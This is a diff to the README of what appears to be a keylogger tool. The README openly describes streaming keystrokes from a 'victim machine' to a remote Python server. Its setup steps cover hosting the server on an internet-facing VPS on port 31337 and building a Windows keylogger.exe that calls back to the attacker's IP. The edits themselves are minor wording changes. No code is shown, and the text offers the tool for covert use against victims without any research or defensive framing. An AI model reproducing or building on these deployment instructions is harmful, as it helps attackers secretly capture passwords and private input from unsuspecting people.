@@ -4,12 +4,12 @@
 This is keylogger tool which will stream keys from a victim machine to a remote python server
 
 # Setup
-To setup the server, simple copy `server.py` onto an internet-facing linux machine (a VPS would do) and run the server code using python
+To setup the server, simple copy `server.py` onto an internet-facing linux host (a VPS would do) and run the server code using python
 i.e `python server.py`
 
 The server is automatically set to open port 31337...DO NOT CHANGE THIS.
 
-To setup your own binary exe, run the setup tool and enter the IP address of your callback server when prompted.
+To setup your own windows exe, run the setup tool and enter the IP address of your callback server when prompted.
 
 The setup tool will then generate an exe by the name of `keylogger.exe`
 
